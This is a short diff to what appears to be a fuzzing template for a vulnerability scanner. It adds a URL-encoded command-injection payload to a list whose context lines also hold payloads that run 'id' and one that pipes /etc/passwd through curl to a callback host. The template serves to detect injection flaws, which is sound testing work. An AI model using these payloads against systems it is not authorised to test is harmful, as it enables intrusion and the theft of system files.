@@ -48,6 +48,7 @@ requests:
         - "1;system('id')"
         - "|%20curl%20-d%20@/etc/passwd%20{{marker}}"
         - "'.print((`id`)).'"
+        - "%26echo%20`id`%24()%5C%20"
 
     fuzzing:
       - part: query
